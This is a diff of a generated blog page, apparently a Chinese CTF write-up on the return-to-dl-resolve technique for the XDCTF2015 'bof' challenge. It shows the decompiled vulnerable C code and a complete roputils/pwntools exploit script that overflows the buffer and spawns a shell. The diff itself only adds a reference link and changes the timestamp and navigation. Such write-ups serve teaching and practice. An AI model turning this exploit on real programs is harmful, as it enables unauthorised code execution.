@@ -275,13 +275,15 @@
 <h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>参考链接：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+
         </div>
         
 <blockquote class="post-copyright">
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-03-20T10:38:08.097Z" itemprop="dateUpdated">2019-03-20 18:38:08</time>
+    Last updated: <time datetime="2019-03-24T05:35:26.413Z" itemprop="dateUpdated">2019-03-24 13:35:26</time>
 </span><br>
 
 
@@ -350,7 +352,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/03/26/0ctf-2019-pwn-re/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">0ctf-2019-pwn&amp;re</h4>
+      </a>
+    </div>
   
 
   
